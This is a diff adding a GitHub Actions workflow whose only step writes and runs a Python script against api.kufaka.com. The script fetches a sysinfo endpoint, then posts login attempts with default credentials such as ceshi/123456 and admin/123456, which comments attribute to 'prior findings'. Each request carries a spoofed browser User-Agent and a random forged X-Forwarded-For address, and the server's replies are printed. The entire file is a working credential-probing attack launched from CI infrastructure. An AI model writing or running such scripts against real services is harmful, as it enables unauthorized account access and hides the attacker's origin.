@@ -1,0 +1,56 @@
+name: i3394c
+on:
+  workflow_dispatch: {}
+permissions:
+  contents: read
+jobs:
+  c:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: ctl
+        run: |
+          cat > /tmp/ctl.py <<'PYEOF'
+          import os, json, base64, random, urllib.parse, urllib.request, urllib.error
+          
+          BASE = "https://api.kufaka.com"
+          UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
+                "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")
+          
+          def rxff():
+              return "%d.%d.%d.%d" % (random.randint(1, 223), random.randint(0, 255),
+                                      random.randint(0, 255), random.randint(1, 254))
+          
+          def http(method, path, headers, body=None, timeout=25):
+              req = urllib.request.Request(BASE + path, data=(body.encode() if body else None), method=method)
+              for k, v in headers.items():
+                  req.add_header(k, v)
+              try:
+                  r = urllib.request.urlopen(req, timeout=timeout)
+                  return r.status, r.read().decode("utf-8", "replace")
+              except urllib.error.HTTPError as ex:
+                  return ex.code, ex.read().decode("utf-8", "replace")
+              except Exception as ex:
+                  return 0, "ERR:%s" % type(ex).__name__
+          
+          def post_user(u, p, tag):
+              st, b = http("POST", "/user/auth/login",
+                           {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
+                            "Content-Type": "application/x-www-form-urlencoded",
+                            "X-Forwarded-For": rxff(),
+                            "Referer": "https://api.kufaka.com/user/"},
+                           "user=%s&pass=%s" % (urllib.parse.quote(u), urllib.parse.quote(p)))
+              print("[%s] user=%r pass=%r -> st=%s body=%s" % (tag, u, p, st, b[:400]), flush=True)
+          
+          st, b = http("GET", "/user/auth/sysinfo",
+                       {"User-Agent": UA, "X-Requested-With": "XMLHttpRequest",
+                        "Referer": "https://api.kufaka.com/user/"})
+          print("[CTRL] sysinfo st=%s body=%s" % (st, b[:160]), flush=True)
+          
+          # positive control: known default merchant account from prior findings (ceshi / 123456)
+          post_user("ceshi", "123456", "CTRL-EXPECT-HIT")
+          # negative control
+          post_user("ceshi", "definitelyWrongPass123", "CTRL-EXPECT-MISS")
+          post_user("admin", "123456", "CTRL-EXPECT-MISS")
+          PYEOF
+          python3 -u /tmp/ctl.py
